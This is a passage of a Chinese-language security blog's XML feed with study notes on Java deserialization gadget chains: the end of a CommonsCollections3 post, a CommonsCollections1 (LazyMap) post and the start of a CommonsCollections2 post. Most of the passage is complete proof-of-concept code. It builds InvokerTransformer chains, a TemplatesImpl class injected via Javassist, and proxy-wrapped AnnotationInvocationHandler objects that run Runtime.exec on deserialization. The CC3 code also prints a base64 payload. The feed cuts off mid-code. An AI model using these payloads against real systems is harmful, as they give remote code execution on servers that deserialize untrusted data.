class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationdhdlConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span>  <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class,transformedMap);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="利用javasist"><a href="#利用javasist" class="headerlink" title="利用javasist"></a>利用javasist</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc3</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(String name, Object target, Object value)</span> &#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> target.getClass().getDeclaredField(name);<br>           field.setAccessible(<span class="hljs-literal">true</span>);<br>           field.set(target, value);<br>      &#125; <span class="hljs-keyword">catch</span> (Exception ignore) &#123;<br>      &#125;<br>  &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] createEvil() <span class="hljs-keyword">throws</span> Exception &#123;<br>       <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>       <span class="hljs-type">CtClass</span> <span class="hljs-variable">abstractTranslet</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>       <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>       <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(new String[]&#123;\&quot;calc\&quot;&#125;);&quot;</span>;<br>       clazz.makeClassInitializer().insertBefore(cmd);<br>       clazz.setSuperclass(abstractTranslet);<br>       <span class="hljs-keyword">return</span> clazz.toBytecode();<br>  &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>       <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>       setValue(<span class="hljs-string">&quot;_bytecodes&quot;</span>, templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;createEvil()&#125;);<br>       setValue(<span class="hljs-string">&quot;_name&quot;</span>, templates, <span class="hljs-string">&quot;a&quot;</span>);<br>       setValue(<span class="hljs-string">&quot;_tfactory&quot;</span>, templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>       Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;<br>              )<br>      &#125;;<br>       <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>       <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(),chainedTransformer);<br>       <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(),<span class="hljs-literal">null</span>);<br>       <span class="hljs-type">HashMap</span> <span class="hljs-variable">hm</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>       hm.put(tme,<span class="hljs-literal">null</span>);<br>       setValue(<span class="hljs-string">&quot;map&quot;</span>,tme,lazymap);<br>       <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos).writeObject(hm);<br>       <span class="hljs-type">String</span> <span class="hljs-variable">paylaod</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<br>               Base64.getEncoder().encode(bos.toByteArray())<br>      );<br>       System.out.println(paylaod);<br>       <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(<br>                       Base64.getDecoder().decode(paylaod)<br>              )<br>      );<br>       ois.readObject();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cc链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonCollection1（LazyMap）</title>
    <link href="/2022/03/04/CommonCollection1%EF%BC%88LazyMap%EF%BC%89/"/>
    <url>/2022/03/04/CommonCollection1%EF%BC%88LazyMap%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonCollection1（LazyMap）"><a href="#CommonCollection1（LazyMap）" class="headerlink" title="CommonCollection1（LazyMap）"></a>CommonCollection1（LazyMap）</h1><p>今天准备复习cc3，但是想到其实cc3是cc2和cc1的结合。然后那时候都忘记复习cc1的另外一条链子了。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">objectInputStream.read<span class="hljs-constructor">Object()</span><br> <span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>     <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span>                     <br></code></pre></td></tr></table></figure><p>变得无非就是 **TransformedMap.setValue()<strong>这一步变成了，</strong>LazyMap.get()**，LazyMap这里相对来说更繁琐一些。<br>逐个分析。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041849264.png" alt="QQ截图20220304184908"></p><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap()"></a>LazyMap()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041833631.png" alt="QQ截图20220304183257"></p><p>其中的get方法调用了<strong>transform</strong>，后续跟transform一样。<br>看一下<strong>factory</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041903384.png" alt="QQ截图20220304183440"></p><p>可控。那么现在就要找哪里调用了<strong>get（）</strong>方法。</p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>其中的<strong>invoke</strong>刚好调用了<strong>get</strong>方法。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041837323.png" alt="QQ截图20220304183737"></p><p>可以看到这里的<strong>menberValues</strong>，也是可控的。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041903317.png" alt="QQ截图20220304183835"></p><p>在注意的一点就是这里继承了<strong>InvocationHandler</strong>。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041839966.png" alt="QQ截图20220304183700"></p><p>那么要调用这里的<strong>invoke</strong>就轻而易举了。直接一波动态代理。至于动态代理emmm之前复习文章有。嘿嘿。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>代理后的对象叫做proxyMap，但不能直接对其进行序列化，因为入口点是sun.reflect.annotation.AnnotationInvocationHandler#readObject，所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc1DemoTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> LazyMap.decorate(objectObjectHashMap, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> aClass.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, decorate);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;, (InvocationHandler) o);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, proxyMap);<br>        serialize(o1);<br>        unserialize(<span class="hljs-string">&quot;xsw6_a.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6_a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cc链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections2</title>
    <link href="/2022/03/03/CommonsCollections2/"/>
    <url>/2022/03/03/CommonsCollections2/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><p>如果CC1理解的很充分，理解CC2就跟玩一样。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br> <br>      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235712.png" alt="QQ截图20220303211048"></p><p><strong>PriorityQueue</strong>就相当于代替了cc1中的<strong>AnnotationInvocationHandler</strong>。先继续跟进入<strong>heapify()</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235455.png" alt="QQ截图20220303211540"></p><p>然后继续跟进。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235683.png" alt="QQ截图20220303211553"></p><p>然后看看这两个地方。发现这里的<strong>siftDownUsingComparator()<strong>里面调用了</strong>comparator.compare</strong>。而这里凑巧的就是 <strong>TransformingComparator</strong><br>实现了 <strong>compare</strong>接口。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235792.png" alt="QQ截图20220303211839"></p><p>并且调用了<strong>transform</strong>。后续就跟cc1，差不多。<br>一个一个分析。</p><h2 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br></code></pre></td></tr></table></figure><p>传入就可，后续直接调用<strong>transform</strong></p><h2 id="heapify"><a href="#heapify" class="headerlink" title="heapify()"></a>heapify()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>          siftDown(i, (E) queue[i]);<br>  &#125;<br></code></pre></td></tr></table></figure><p>这里判断了size&gt;&gt;&gt;1。才能进入  <strong>siftDown(i, (E) queue[i]);</strong></p><h2 id="siftDown"><a href="#siftDown" class="headerlink" title="siftDown()"></a>siftDown()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>      <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)<br>          siftDownUsingComparator(k, x);<br>      <span class="hljs-keyword">else</span><br>          siftDownComparable(k, x);<br>  &#125;<br></code></pre></td></tr></table></figure><p>这里为了进入 <strong>siftDownUsingComparator(k, x)<strong>要保证</strong>comparator</strong>不可以为空。<br>并且这里传入的值不能小于1。不然这里会报错。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032236941.png" alt="QQ截图20220303214616"></p><p>所以构造。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>, transformingComparator);<br></code></pre></td></tr></table></figure><h2 id="POC（残缺）"><a href="#POC（残缺）" class="headerlink" title="POC（残缺）"></a>POC（残缺）</h2><p>这样就是是没有反序列化也能进行弹计算器，还弹了连个。emmm…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc2Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title 